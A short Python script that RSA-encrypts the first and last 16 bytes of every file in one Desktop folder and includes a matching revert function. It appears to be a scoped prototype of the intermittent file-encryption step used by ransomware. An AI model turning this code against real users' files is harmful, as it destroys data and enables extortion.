import os
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
import winshell

# Get the desktop folder path for the current user

with open('public_key.pem', 'rb') as f:
    public_key_data = f.read()
    public_key = serialization.load_pem_public_key(public_key_data)

with open('private_key.pem', 'rb') as f:
    private_key_data = f.read()
    private_key = serialization.load_pem_private_key(
        private_key_data,
        password=None
    )

desktop_folder = winshell.desktop()

def encrypt_bytes():
    for folder_name in os.listdir(desktop_folder):
        if folder_name == "fuckme":
            folder_path = os.path.join(desktop_folder, folder_name)
            for file_name in os.listdir(folder_path):
                file_path = os.path.join(folder_path, file_name)
                with open(file_path, "rb") as file:
                    byte_values = file.read()
                    if len(byte_values) >= 32:
                        first_16_bytes = byte_values[:16]
                        last_16_bytes = byte_values[-16:]

                        encrypted_first_16_bytes = public_key.encrypt(first_16_bytes, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
                        encrypted_last_16_bytes = public_key.encrypt(last_16_bytes, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
                        byte_values = encrypted_first_16_bytes + byte_values[16:-16] + encrypted_last_16_bytes

                    with open(file_path, "wb") as file:
                        file.write(byte_values)


def revert_bytes():
    for folder_name in os.listdir(desktop_folder):
        if folder_name == "fuckme":
            folder_path = os.path.join(desktop_folder, folder_name)
            for file_name in os.listdir(folder_path):
                file_path = os.path.join(folder_path, file_name)
                with open(file_path, "rb") as file:
                    byte_values = file.read()
                    if len(byte_values) >= 32:
                        encrypted_first_16_bytes = byte_values[:private_key.key_size // 8]
                        encrypted_last_16_bytes = byte_values[-private_key.key_size // 8:]
                        decrypted_first_16_bytes = private_key.decrypt(encrypted_first_16_bytes, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
                        decrypted_last_16_bytes = private_key.decrypt(encrypted_last_16_bytes, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
                        byte_values = decrypted_first_16_bytes + byte_values[private_key.key_size // 8:-private_key.key_size // 8] + decrypted_last_16_bytes

                with open(file_path, "wb") as file:
                    file.write(byte_values)         

# uncomment the function you want to run
#encrypt_bytes()
#revert_bytes()